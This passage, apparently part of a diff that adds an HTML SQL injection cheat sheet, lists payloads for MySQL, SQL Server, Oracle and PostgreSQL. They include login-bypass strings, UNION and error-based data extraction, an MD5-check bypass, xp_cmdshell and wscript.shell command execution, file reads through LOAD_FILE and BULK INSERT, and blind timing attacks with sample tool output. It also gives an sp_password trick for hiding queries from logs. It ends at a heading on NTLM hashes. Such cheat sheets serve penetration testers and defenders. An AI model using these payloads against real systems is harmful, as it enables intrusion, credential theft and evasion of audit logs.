+operator` it'll return 0. A better way to do it is using&nbsp;<code>CONCAT()</code>function in MySQL.</p>
+<ul>
+<li><code>CONCAT(str1, str2, str3, ...)</code>&nbsp;(M)&nbsp;<br>Concatenate supplied strings.&nbsp;<br><code>SELECT&nbsp;CONCAT(login, password)&nbsp;FROM members</code></li>
+</ul>
+<h3><a id="StringwithoutQuotes" name="StringwithoutQuotes" rel="noreferrer"></a>Strings without Quotes</h3>
+<p>These are some direct ways to using strings but it's always possible to use&nbsp;<code>CHAR()</code>(MS) and&nbsp;<code>CONCAT()</code>(M) to generate string without quotes.</p>
+<ul>
+<li><code>0x457578</code>&nbsp;(M) -&nbsp;Hex Representation of string&nbsp;<br><code>SELECT 0x457578</code>&nbsp;<br>This will be selected as string in MySQL.&nbsp;<br><br>In MySQL easy way to generate hex representations of strings use this;&nbsp;<br><code>SELECT CONCAT('0x',HEX('c:\\boot.ini'))</code></li>
+<li>Using&nbsp;<code>CONCAT()</code>&nbsp;in MySQL&nbsp;<br><code>SELECT CONCAT(CHAR(75),CHAR(76),CHAR(77))</code>&nbsp;(M)&nbsp;<br>This will return 'KLM'.</li>
+<li><code>SELECT CHAR(75)+CHAR(76)+CHAR(77)</code>&nbsp;(S)&nbsp;<br>This will return 'KLM'.</li>
+<li><code>SELECT CHR(75)||CHR(76)||CHR(77)</code>&nbsp;(O)&nbsp;<br>This will return 'KLM'.</li>
+<li><code>SELECT (CHaR(75)||CHaR(76)||CHaR(77))</code>&nbsp;(P)&nbsp;<br>This will return 'KLM'.</li>
+</ul>
+<h4><a id="HexbasedSamples" name="HexbasedSamples" rel="noreferrer"></a>Hex based SQL Injection Samples</h4>
+<ul>
+<li><code>SELECT LOAD_FILE(0x633A5C626F6F742E696E69)</code>&nbsp;(M)&nbsp;<br>This will show the content of&nbsp;<strong>c:\boot.ini</strong></li>
+</ul>
+<h3><a id="StringModification" name="StringModification" rel="noreferrer"></a>String Modification &amp; Related</h3>
+<ul>
+<li><code>ASCII()</code>&nbsp;(SMP)&nbsp;<br>Returns ASCII character value of leftmost character. A must have function for Blind SQL Injections.&nbsp;<br><br><code>SELECT ASCII('a')</code></li>
+<li><code>CHAR()</code>&nbsp;(SM)&nbsp;<br>Convert an integer of ASCII.&nbsp;<br><br><code>SELECT CHAR(64)</code></li>
+</ul>
+<h2><a id="UnionInjections" name="UnionInjections" rel="noreferrer"></a>Union Injections</h2>
+<p>With union you do SQL queries cross-table. Basically you can poison query to return records from another table.</p>
+<p><code>SELECT header, txt FROM news UNION ALL SELECT name, pass FROM members&nbsp;</code><br>This will combine results from both news table and members table and return all of them.</p>
+<p>Another Example:&nbsp;<br><code>' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--</code></p>
+<h3><a id="UnionLanguageIssues" name="UnionLanguageIssues" rel="noreferrer"></a>UNION – Fixing Language Issues</h3>
+<p>While exploiting Union injections sometimes you get errors because of different language settings (<em>table settings, field settings, combined table / db settings etc.</em>) these functions are quite useful to fix this problem. It's rare but if you dealing with&nbsp;<em>Japanese, Russian, Turkish</em>&nbsp;etc. applications then you will see it.</p>
+<ul>
+<li>SQL Server (S)&nbsp;<br>Use&nbsp;<code>field</code>&nbsp;<strong><code>COLLATE</code></strong><code>&nbsp;SQL_Latin1_General_Cp1254_CS_AS</code>&nbsp;or some other valid one -&nbsp;<em>check out SQL Server documentation</em>.&nbsp;<br><br><code>SELECT header FROM news UNION ALL SELECT name COLLATE SQL_Latin1_General_Cp1254_CS_AS FROM members</code></li>
+<li>MySQL (M)&nbsp;<br><code>Hex()&nbsp;</code>for every possible issue</li>
+</ul>
+<h3><a id="ByPassingLoginScreens" name="ByPassingLoginScreens" rel="noreferrer"></a>Bypassing Login Screens (SMO+)</h3>
+<p><em>SQL Injection 101</em>, Login tricks</p>
+<ul>
+<li><code>admin' --</code></li>
+<li><code>admin' #</code></li>
+<li><code>admin'/*</code></li>
+<li><code>' or 1=1--</code></li>
+<li><code>' or 1=1#</code></li>
+<li><code>' or 1=1/*</code></li>
+<li><code>') or '1'='1--</code></li>
+<li><code>') or ('1'='1--</code></li>
+<li>....</li>
+</ul>
+<ul>
+<li>Login as different user (SM*)&nbsp;<br><code>' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--</code></li>
+</ul>
+<p><em>*Old versions of MySQL doesn't support union queries</em></p>
+<h3>Bypassing second MD5 hash check login screens</h3>
+<p>If application is first getting the record by username and then 
+compare returned MD5 with supplied password's MD5 then you need to some 
+extra tricks to fool application to bypass authentication. You can union
+ results with a known password and MD5 hash of supplied password. In 
+this case application will compare your password and your supplied MD5 
+hash instead of MD5 from database.</p>
+<h4><a id="BypassingMD5Hash" name="BypassingMD5Hash" rel="noreferrer"></a>Bypassing MD5 Hash Check Example (MSP)</h4>
+<p>Username :<code><span>admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'</span></code><br>Password : <code><span>1234</span></code></p>
+<p><code>81dc9bdb52d04dc20036dbd8313ed055 = MD5(1234)</code></p>
+<h3>&nbsp;</h3>
+<h3>Error Based - Find Columns Names</h3>
+<h4>Finding Column Names with&nbsp;<strong>HAVING BY</strong>&nbsp;- Error Based (S)</h4>
+<p><em>In the same order,</em></p>
+<ul>
+<li>'<code>&nbsp;HAVING 1=1 --</code></li>
+<li><code>' GROUP BY&nbsp;<strong>table.columnfromerror1</strong>&nbsp;HAVING 1=1 --</code></li>
+<li><code>' GROUP BY&nbsp;<strong>table.columnfromerror1, columnfromerror2</strong>&nbsp;HAVING 1=1 --</code></li>
+<li><code>' GROUP BY&nbsp;<strong>table.columnfromerror1, columnfromerror2, columnfromerror(n)&nbsp;</strong>HAVING 1=1 --</code>&nbsp;<em>and so on</em></li>
+<li>If you are not getting any more error then it's done.</li>
+</ul>
+<h4>Finding how many columns in SELECT query by&nbsp;<strong>ORDER BY</strong>&nbsp;<strong>(MSO+)</strong></h4>
+<p>Finding column number by ORDER BY can speed up the UNION SQL Injection process.</p>
+<ul>
+<li><code>ORDER BY 1--</code></li>
+<li><code>ORDER BY 2--</code></li>
+<li><code>ORDER BY N--</code>&nbsp;<em>so on</em></li>
+<li>Keep going until get an error. Error means you found the number of selected columns.</li>
+</ul>
+<h3>Data types, UNION, etc.</h3>
+<h4>Hints,</h4>
+<ul>
+<li>Always use&nbsp;<strong>UNION</strong>&nbsp;with&nbsp;<strong>ALL&nbsp;</strong>because of&nbsp;<strong>image</strong>&nbsp;similar non-distinct field types. By default union tries to get records with distinct.</li>
+<li>To get rid of unrequired records from left table use -1 or any not exist record search in the beginning of query (<em>if injection is in WHERE</em>). This can be critical if you are only getting one result at a time.</li>
+<li>Use NULL in UNION injections for most data type instead of trying to guess string, date, integer etc.
+<ul>
+<li>Be careful in Blind situtaions may you can understand error is 
+coming from DB or application itself. Because languages like ASP.NET 
+generally throws errors while trying to use NULL values (<em>because normally developers are not expecting to see NULL in a username field</em>)</li>
+</ul>
+</li>
+</ul>
+<h4>Finding Column Type</h4>
+<ul>
+<li><code>' union select&nbsp;sum(<strong>columntofind</strong>)&nbsp;from&nbsp;<strong>users</strong>--</code>&nbsp;(S)&nbsp;<br><code>Microsoft OLE DB Provider for ODBC Drivers error '80040e07'&nbsp;<br>[Microsoft][ODBC SQL Server Driver][SQL Server]The sum or average aggregate operation cannot take a&nbsp;<strong>varchar</strong>&nbsp;data type as an argument.</code>&nbsp;<br><br><em>If you are not getting an error it means&nbsp;</em>column is numeric.</li>
+<li>Also you can use&nbsp;CAST()&nbsp;or&nbsp;CONVERT()
+<ul>
+<li><code>SELECT * FROM Table1 WHERE id = -1 UNION ALL SELECT null, 
+null, NULL, NULL, convert(image,1), null, null,NULL, NULL, NULL, NULL, 
+NULL, NULL, NULL, NULL, NULl, NULL--</code></li>
+</ul>
+</li>
+<li><code>11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE 1=2 –-</code>&nbsp;<br>No Error - Syntax is right. MS SQL Server Used. Proceeding.</li>
+<li><code>11223344) UNION SELECT 1,NULL,NULL,NULL WHERE 1=2 –-</code>&nbsp;<br>No Error – First column is an integer.</li>
+<li><code>11223344) UNION SELECT 1,2,NULL,NULL WHERE 1=2 --&nbsp;</code><br>Error! – Second column is not an integer.</li>
+<li><code>11223344) UNION SELECT 1,'2',NULL,NULL WHERE 1=2 –-</code>&nbsp;<br>No Error – Second column is a string.</li>
+<li><code>11223344) UNION SELECT 1,'2',3,NULL WHERE 1=2 –-</code>&nbsp;<br>Error! – Third column is not an integer. ...&nbsp;<br><br><code>Microsoft OLE DB Provider for SQL Server error '80040e07'&nbsp;<br>Explicit conversion from data type&nbsp;<strong>int</strong>&nbsp;to image&nbsp;is not allowed.</code></li>
+</ul>
+<p><strong>You'll get convert() errors before union target errors !&nbsp;</strong>So start with convert() then union</p>
+<h3>Simple Insert (MSO+)</h3>
+<p><code>'; insert into users values( 1, 'hax0r', 'coolpass', 9 )/*</code></p>
+<h3>Useful Function / Information Gathering / Stored Procedures / Bulk SQL Injection Notes</h3>
+<p><strong>@@version</strong>&nbsp;(MS)&nbsp;<br>Version of database and
+ more details for SQL Server. It's a constant. You can just select it 
+like any other column, you don't need to supply table name. Also, you 
+can use insert, update statements or in functions.</p>
+<p><code>INSERT INTO members(id, user, pass) VALUES(1, ''+SUBSTRING(@@version,1,10)&nbsp;,10)</code></p>
+<h4><a id="BulkInsert" name="BulkInsert" rel="noreferrer"></a>Bulk Insert (S)</h4>
+<p>Insert a file content to a table. If you don't know internal path of web application you can&nbsp;<strong>read IIS (</strong><em>IIS 6 only</em><strong>) metabase file</strong>(<em>%systemroot%\system32\inetsrv\MetaBase.xml</em>) and then search in it to identify application path.</p>
+<ol>
+<li>Create table foo( line varchar(8000) )</li>
+<li>bulk insert foo from 'c:\inetpub\wwwroot\login.asp'</li>
+<li><em>Drop temp table, and repeat for another file.</em></li>
+</ol>
+<h4>BCP (S)</h4>
+<p>Write text file. Login Credentials are required to use this function.&nbsp;<br><code>bcp "SELECT * FROM test..foo" queryout c:\inetpub\wwwroot\runcommand.asp -c -Slocalhost -Usa -Pfoobar</code></p>
+<h4>VBS, WSH in SQL Server (S)</h4>
+<p>You can use VBS, WSH scripting in SQL Server because of ActiveX support.</p>
+<p><code>declare @o int&nbsp;<br>exec sp_oacreate 'wscript.shell', @o out&nbsp;<br>exec sp_oamethod @o, 'run', NULL, 'notepad.exe'&nbsp;<br></code><code><em>Username:</em>&nbsp;'; declare @o int exec sp_oacreate 'wscript.shell', @o out exec sp_oamethod @o, 'run', NULL, 'notepad.exe' --&nbsp;<br></code></p>
+<h4>Executing system commands, xp_cmdshell (S)</h4>
+<p>Well known trick, By default it's disabled in&nbsp;<em>SQL Server 2005.&nbsp;</em>You need to have admin access.</p>
+<p><code>EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:'</code></p>
+<p>Simple ping check (<em>configure your firewall or sniffer to identify request before launch it</em>),</p>
+<p><code>EXEC master.dbo.xp_cmdshell 'ping '</code></p>
+<p>You can not read results directly from error or union or something else.</p>
+<h4>Some Special Tables in SQL Server (S)</h4>
+<ul>
+<li>Error Messages&nbsp;<br><code>master..sysmessages</code></li>
+<li>Linked Servers&nbsp;<br><code>master..sysservers</code></li>
+<li>Password (<em>2000 and 20005 both can be crackable, they use very similar hashing algorithm&nbsp;</em>)&nbsp;<br>SQL Server 2000:<code>&nbsp;masters..sysxlogins</code>&nbsp;<br>SQL Server 2005 :&nbsp;<code>sys.sql_logins&nbsp;<br></code></li>
+</ul>
+<h4>More Stored Procedures for SQL Server (S)</h4>
+<ol>
+<li>Cmd Execute (<strong>xp_cmdshell</strong>)&nbsp;<br>exec master..xp_cmdshell 'dir'</li>
+<li>Registry Stuff (<strong>xp_regread</strong>)&nbsp;<br>
+<ol>
+<li>xp_regaddmultistring</li>
+<li>xp_regdeletekey</li>
+<li>xp_regdeletevalue</li>
+<li>xp_regenumkeys</li>
+<li>xp_regenumvalues</li>
+<li>xp_regread</li>
+<li>xp_regremovemultistring</li>
+<li>xp_regwrite&nbsp;<br>exec xp_regread HKEY_LOCAL_MACHINE, 'SYSTEM\CurrentControlSet\Services\lanmanserver\parameters', 'nullsessionshares'&nbsp;<br>exec xp_regenumvalues HKEY_LOCAL_MACHINE, 'SYSTEM\CurrentControlSet\Services\snmp\parameters\validcommunities'</li>
+</ol>
+</li>
+<li>Managing Services (<strong>xp_servicecontrol</strong>)</li>
+<li>Medias (<strong>xp_availablemedia</strong>)</li>
+<li>ODBC Resources (<strong>xp_enumdsn</strong>)</li>
+<li>Login mode (<strong>xp_loginconfig</strong>)</li>
+<li>Creating Cab Files (<strong>xp_makecab</strong>)</li>
+<li>Domain Enumeration (<strong>xp_ntsec_enumdomains</strong>)</li>
+<li>Process Killing (<em>need PID</em>) (<strong>xp_terminate_process</strong>)</li>
+<li>Add new procedure (<em>virtually you can execute whatever you want</em>)&nbsp;<br>sp_addextendedproc 'xp_webserver', 'c:\temp\x.dll'&nbsp;<br>exec xp_webserver</li>
+<li>Write text file to a UNC or an internal path (sp_makewebtask)</li>
+</ol>
+<h4>MSSQL Bulk Notes</h4>
+<p><code>SELECT * FROM master..sysprocesses /*WHERE spid=@@SPID*/</code></p>
+<p><code>DECLARE @result int; EXEC @result = xp_cmdshell 'dir *.exe';IF (@result = 0) SELECT 0 ELSE SELECT 1/0</code></p>
+<p>HOST_NAME()&nbsp;<br>IS_MEMBER (Transact-SQL)&nbsp;&nbsp;<br>IS_SRVROLEMEMBER (Transact-SQL)&nbsp;&nbsp;<br>OPENDATASOURCE (Transact-SQL)</p>
+<pre>INSERT tbl EXEC master..xp_cmdshell OSQL /Q"DBCC SHOWCONTIG"</pre>
+<p>OPENROWSET (Transact-SQL)&nbsp; -&nbsp;<a href="http://msdn2.microsoft.com/en-us/library/ms190312.aspx" rel="noreferrer">http://msdn2.microsoft.com/en-us/library/ms190312.aspx</a></p>
+<p>You can not use sub selects in SQL Server Insert queries.</p>
+<h4>SQL Injection in LIMIT (M) or ORDER (MSO)</h4>
+<p><code>SELECT id, product FROM test.test t LIMIT 0,0 UNION ALL SELECT 1,'x'/*,10 ;</code></p>
+<p>If injection is in second&nbsp;<em>limit</em>&nbsp;you can comment it out or use in your union injection</p>
+<h4>Shutdown SQL Server (S)</h4>
+<p>When you're really pissed off,&nbsp;<code>';shutdown --</code></p>
+<h3><a id="Enablecmdshell" name="Enablecmdshell" rel="noreferrer"></a>Enabling xp_cmdshell in SQL Server 2005</h3>
+<p>By default xp_cmdshell and couple of other potentially dangerous 
+stored procedures are disabled in SQL Server 2005. If you have admin 
+access then you can enable these.</p>
+<p><code>EXEC sp_configure 'show advanced options',1&nbsp;<br>RECONFIGURE</code></p>
+<p><code>EXEC sp_configure 'xp_cmdshell',1&nbsp;<br>RECONFIGURE</code></p>
+<h3><a id="FindingDatabase" rel="noreferrer"></a>Finding Database Structure in SQL Server (S)</h3>
+<h4>Getting User defined Tables</h4>
+<p><code>SELECT name FROM sysobjects WHERE xtype = 'U'</code></p>
+<h4>Getting Column Names</h4>
+<p><code>SELECT name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'tablenameforcolumnnames')</code></p>
+<h3>Moving records (S)</h3>
+<ul>
+<li>Modify WHERE and use&nbsp;<strong><code>NOT IN</code></strong>&nbsp;or&nbsp;<strong><code>NOT EXIST</code></strong>,&nbsp;<br><code>... WHERE users NOT IN ('First User', 'Second User')</code>&nbsp;<br><code>SELECT TOP 1 name FROM members WHERE NOT EXIST(SELECT TOP 0 name FROM members)</code>&nbsp;<em>-- very good one</em></li>
+<li>Using Dirty Tricks&nbsp;<br><code>SELECT * FROM Product WHERE ID=2 
+AND 1=CAST((Select p.name from (SELECT (SELECT COUNT(i.id) AS rid FROM 
+sysobjects i WHERE i.id&lt;=o.id) AS x, name from sysobjects o) as p 
+where p.x=3) as int&nbsp;</code><br><code><br>Select p.name from (SELECT
+ (SELECT COUNT(i.id) AS rid FROM sysobjects i WHERE xtype='U' and 
+i.id&lt;=o.id) AS x, name from sysobjects o WHERE o.xtype = 'U') as p 
+where p.x=21</code></li>
+</ul>
+<p>&nbsp;</p>
+<h3><a id="FastWayToExtract" rel="noreferrer"></a>Fast way to extract data from Error Based SQL Injections in SQL Server (S)</h3>
+<p><code>';BEGIN DECLARE @rt varchar(8000) SET @rd=':' SELECT @rd=@rd+' 
+'+name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name =
+ 'MEMBERS') AND name&gt;@rd SELECT @rd AS rd into TMP_SYS_TMP end;--</code></p>
+<p><strong>Detailed Article:&nbsp;</strong><span id="gr"><a href="http://ferruh.mavituna.com/fast-way-to-extract-data-from-error-based-sql-injections-oku/" rel="noreferrer">Fast way to extract data from Error Based SQL Injections</a></span></p>
+<h3>Finding Database Structure in MySQL&nbsp;(M)</h3>
+<h4>Getting User defined Tables</h4>
+<p><code>SELECT table_name FROM information_schema.tables&nbsp;WHERE table_schema = 'databasename'</code></p>
+<h4>Getting Column Names</h4>
+<p><code>SELECT table_name, column_name&nbsp;FROM information_schema.columns WHERE&nbsp;table_name = 'tablename'</code></p>
+<h3>Finding Database Structure in Oracle&nbsp;(O)</h3>
+<h4>Getting User defined Tables</h4>
+<p><code>SELECT&nbsp;* FROM all_tables WHERE OWNER = 'DATABASE_NAME'</code></p>
+<h4>Getting Column Names</h4>
+<p><code>SELECT * FROM all_col_comments WHERE TABLE_NAME = 'TABLE'</code></p>
+<h2><a id="BlindSQLInjections" rel="noreferrer"></a>Blind SQL Injections</h2>
+<h3>About Blind SQL Injections</h3>
+<p>In a quite good production application generally&nbsp;<strong>you can not see error responses on the page</strong>,
+ so you can not extract data through Union attacks or error based 
+attacks. You have to do use Blind SQL Injections attacks to extract 
+data. There are two kind of Blind Sql Injections.</p>
+<p><strong>Normal Blind</strong>, You can not see a response in the page, but you can still determine result of a query from response or HTTP status code&nbsp;<br><strong>Totally Blind</strong>,
+ You can not see any difference in the output in any kind. This can be 
+an injection a logging function or similar. Not so common, though.</p>
+<p>In normal blinds you can use&nbsp;<strong>if statements</strong>&nbsp;or abuse&nbsp;<strong>WHERE query in injection</strong>&nbsp;(<em>generally easier</em>), in totally blinds you need to use some waiting functions and analyze response times. For this you can use&nbsp;<strong>WAITFOR DELAY '0:0:10'&nbsp;</strong>in SQL Server, BENCHMARK() and <strong>sleep(10)</strong> in MySQL,&nbsp;<strong>pg_sleep(10)&nbsp;</strong>in PostgreSQL, and some PL/SQL tricks in ORACLE.</p>
+<h4><a id="BSQLAttackSamples" name="BSQLAttackSamples" rel="noreferrer"></a>Real and a bit Complex Blind SQL Injection Attack Sample</h4>
+<p>This output taken from a real private Blind SQL Injection tool while 
+exploiting SQL Server back ended application and enumerating table 
+names. This requests done for first char of the first table name. SQL 
+queries a bit more complex then requirement because of automation 
+reasons. In we are trying to determine an ascii value of a char via 
+binary search algorithm.</p>
+<p><em><strong>TRUE</strong>&nbsp;and&nbsp;<strong>FALSE</strong>&nbsp;flags mark queries returned true or false.</em></p>
+<p><code><strong>TRUE</strong>&nbsp;: SELECT ID, Username, Email FROM 
+[User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM 
+sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM 
+sysObjects WHERE xtYpe=0x55)),1,1)),0)&gt;78--&nbsp;<br><br><strong>FALSE</strong>&nbsp;:
+ SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND 
+ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE 
+xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE 
+xtYpe=0x55)),1,1)),0)&gt;103--&nbsp;<br><br><strong>TRUE</strong>&nbsp;:
+ SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND 
+ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE 
+xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE 
+xtYpe=0x55)),1,1)),0)&nbsp;<br><strong>FALSE</strong>&nbsp;: SELECT ID, 
+Username, Email FROM [User]WHERE ID = 1 AND 
+ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE 
+xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE 
+xtYpe=0x55)),1,1)),0)&gt;89--&nbsp;<br><br><strong>TRUE</strong>&nbsp;: 
+SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND 
+ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE 
+xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE 
+xtYpe=0x55)),1,1)),0)&nbsp;<br><strong>FALSE</strong>&nbsp;: SELECT ID, 
+Username, Email FROM [User]WHERE ID = 1 AND 
+ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE 
+xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE 
+xtYpe=0x55)),1,1)),0)&gt;83--&nbsp;<br><br><strong>TRUE</strong>&nbsp;: 
+SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND 
+ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE 
+xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE 
+xtYpe=0x55)),1,1)),0)&nbsp;<br><strong>FALSE</strong>&nbsp;: SELECT ID, 
+Username, Email FROM [User]WHERE ID = 1 AND 
+ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE 
+xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE 
+xtYpe=0x55)),1,1)),0)&gt;80--&nbsp;<br><br><strong>FALSE</strong>&nbsp;:
+ SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND 
+ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE 
+xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE 
+xtYpe=0x55)),1,1)),0)</code></p>
+<p>Since both of the&nbsp;<strong>last 2 queries failed&nbsp;</strong>we clearly know table name's first char's&nbsp;<strong>ascii value is 80 which means first char is `P`</strong>.
+ This is the way to exploit Blind SQL injections by binary search 
+algorithm. Other well-known way is reading data bit by bit. Both can be 
+effective in different conditions.</p>
+<h3>&nbsp;</h3>
+<h3><a id="WaitingForBlindSQLInjections" rel="noreferrer"></a>Making Databases Wait / Sleep&nbsp;For Blind SQL Injection Attacks</h3>
+<p>First of all use this if it's really blind, otherwise just use 1/0 
+style errors to identify difference. Second, be careful while using 
+times more than 20-30 seconds. database API connection or script can be 
+timeout.</p>
+<h4>WAITFOR DELAY 'time' (S)</h4>
+<p>This is just like sleep, wait for specified time. CPU safe way to make database wait.</p>
+<p><code>WAITFOR DELAY '0:0:10'--</code></p>
+<p>Also, you can use fractions like this,</p>
+<p><code>WAITFOR DELAY '0:0:0.51'</code></p>
+<h4>Real World Samples</h4>
+<ul>
+<li>Are we 'sa' ?&nbsp;<br><code>if (select user) = 'sa' waitfor delay '0:0:10'</code></li>
+<li>ProductID =&nbsp;<code>1;waitfor delay '0:0:10'--</code></li>
+<li>ProductID =<code>1);waitfor delay '0:0:10'--</code></li>
+<li>ProductID =<code>1';waitfor delay '0:0:10'--</code></li>
+<li>ProductID =<code>1');waitfor delay '0:0:10'--</code></li>
+<li>ProductID =<code>1));waitfor delay '0:0:10'--</code></li>
+<li>ProductID =<code>1'));waitfor delay '0:0:10'--</code></li>
+</ul>
+<h4>BENCHMARK() (M)</h4>
+<p>Basically, we are abusing this command to make MySQL wait a bit. Be careful you will consume web servers limit so fast!</p>
+<p><code>BENCHMARK(howmanytimes, do this)</code></p>
+<h4>Real World Samples</h4>
+<ul>
+<li>Are we root ? woot!&nbsp;<br><code>IF EXISTS (SELECT * FROM users WHERE username = 'root') BENCHMARK(1000000000,MD5(1))</code></li>
+<li>Check Table exist in MySQL&nbsp;<br><code>IF (SELECT * FROM login) BENCHMARK(1000000,MD5(1))</code></li>
+</ul>
+<h4>pg_sleep(seconds) (P)</h4>
+<p>Sleep for supplied seconds.</p>
+<ul>
+<li><code>SELECT pg_sleep(10);&nbsp;</code><br>Sleep 10 seconds.</li>
+</ul>
+<h4>sleep(seconds) (M)</h4>
+<p>Sleep for supplied seconds.</p>
+<ul>
+<li><code>SELECT sleep(10);&nbsp;</code><br>Sleep 10 seconds.</li>
+</ul>
+<h4>dbms_pipe.receive_message&nbsp;(O)</h4>
+<p>Sleep for supplied seconds.</p>
+<ul>
+<li>
+<p><code>(SELECT CASE WHEN (NVL(ASCII(SUBSTR((<strong>{INJECTION}</strong>),1,1)),0) = 100) THEN dbms_pipe.receive_message(('xyz'),10) ELSE dbms_pipe.receive_message(('xyz'),1) END FROM dual)</code></p>
+<p><strong>{INJECTION}</strong> = You want to run the query.</p>
+<p>If the condition is true, will response after 10 seconds. If is false, will be delayed for one second.</p>
+</li>
+</ul>
+<h2><a id="CoveringYourTracks" rel="noreferrer"></a>Covering Your Tracks</h2>
+<h4>SQL Server -sp_password log bypass (S)</h4>
+<p>SQL Server don't log queries that includes sp_password for security 
+reasons(!). So if you add --sp_password to your queries it will not be 
+in SQL Server logs (<em>of course still will be in web server logs</em>,&nbsp;<em>try to use POST if it's possible</em>)</p>
+<h2><a id="ClearSQLInjectionTests" rel="noreferrer"></a>Clear&nbsp;SQL Injection Tests</h2>
+<p>These tests are simply good for blind sql injection and silent attacks.</p>
+<ol>
+<li><code>product.asp?id=4 (SMO)</code>
+<ol style="list-style-type: lower-alpha;">
+<li><code>product.asp?id=5-1</code></li>
+<li><code>product.asp?id=4 OR 1=1&nbsp;<br><br></code></li>
+</ol>
+</li>
+<li><code>product.asp?name=Book</code>
+<ol style="list-style-type: lower-alpha;">
+<li><code>product.asp?name=Bo'%2b'ok</code></li>
+<li><code>product.asp?name=Bo' || 'ok (<em>OM</em>)</code></li>
+<li><code>product.asp?name=Book' OR 'x'='x</code></li>
+</ol>
+</li>
+</ol>
+<h2><a id="ExtraMySQLNotes" rel="noreferrer"></a>Extra MySQL Notes</h2>
+<ul>
+<li>Sub Queries are working only MySQL 4.1+</li>
+<li>Users
+<ul style="list-style-type: circle;">
+<li><code>SELECT User,Password FROM mysql.user;</code></li>
+</ul>
+</li>
+<li><code>SELECT 1,1 UNION SELECT 
+IF(SUBSTRING(Password,1,1)='2',BENCHMARK(100000,SHA1(1)),0) 
+User,Password FROM mysql.user WHERE User = 'root';</code></li>
+<li><code>SEL</code><code>ECT ... INTO DUMPFILE</code>
+<ul style="list-style-type: circle;">
+<li><code>Write quer</code><code>y into a&nbsp;<strong>new file&nbsp;</strong>(<em>can not modify existing file</em>s)</code></li>
+</ul>
+</li>
+<li>UDF Function
+<ul style="list-style-type: circle;">
+<li><code>create function LockWorkStation returns integer soname 'user32';</code></li>
+<li><code>select LockWorkStation();&nbsp;<br></code></li>
+<li><code>create function ExitProcess returns integer soname 'kernel32';</code></li>
+<li><code>select exitprocess();</code></li>
+</ul>
+</li>
+<li><code>SELECT USER();</code></li>
+<li><code>SELECT password,USER() FROM mysql.user;</code></li>
+<li>First byte of admin hash
+<ul style="list-style-type: circle;">
+<li><code>SELECT SUBSTRING(user_password,1,1) FROM mb_users WHERE user_group = 1;</code></li>
+</ul>
+</li>
+<li>Read File
+<ul style="list-style-type: circle;">
+<li><code>query.php?user=1+union+select+load_file(0x63...),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1</code></li>
+</ul>
+</li>
+<li>MySQL Load Data infile&nbsp;<br>
+<ul style="list-style-type: circle;">
+<li><strong>By default it's not available !</strong>
+<ul style="list-style-type: square;">
+<li><code>create table foo( line blob );&nbsp;<br>load data infile 'c:/boot.ini' into table foo;&nbsp;<br>select * from foo;</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>More Timing in MySQL</li>
+<li><code>select benchmark( 500000, sha1( 'test' ) );</code></li>
+<li><code>query.php?user=1+union+select+benchmark(500000,sha1 (0x414141)),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1</code></li>
+<li><code>select if( user() like 'root@%', benchmark(100000,sha1('test')), 'false' );&nbsp;<br></code><strong>Enumeration data, Guessed Brute Force</strong>
+<ul style="list-style-type: circle;">
+<li><code>select if( (ascii(substring(user(),1,1)) &gt;&gt; 7) &amp; 1, benchmark(100000,sha1('test')), 'false' );</code></li>
+</ul>
+</li>
+</ul>
+<h4>Potentially Useful MySQL Functions</h4>
+<ul>
+<li><code>MD5()</code>&nbsp;<br>MD5 Hashing</li>
+<li><code>SHA1()</code>&nbsp;<br>SHA1 Hashing</li>
+<li><code>PASSWORD()</code></li>
+<li><code>ENCODE()</code></li>
+<li><code>COMPRESS()</code>&nbsp;<br>Compress data, can be great in large binary reading in Blind SQL Injections.</li>
+<li><code>ROW_COUNT()</code></li>
+<li><code>SCHEMA()</code></li>
+<li><code>VERSION()</code>&nbsp;<br>Same as&nbsp;<code>@@version</code></li>
+</ul>
+<h2><a id="SecondOrder" rel="noreferrer"></a>Second Order SQL Injections</h2>
+<p>Basically, you put an SQL Injection to some place and expect it's 
+unfiltered in another action. This is common hidden layer problem.</p>
+<p>Name :&nbsp;<code>' + (SELECT TOP 1 password FROM users ) + '&nbsp;</code><br>Email :<code>&nbsp;xx@xx.com</code></p>
+<p>If application is using name field in an unsafe stored procedure or 
+function, process etc. then it will insert first users password as your 
+name etc.</p>
+<h3>Forcing SQL Server to get NTLM Hashes</h3>
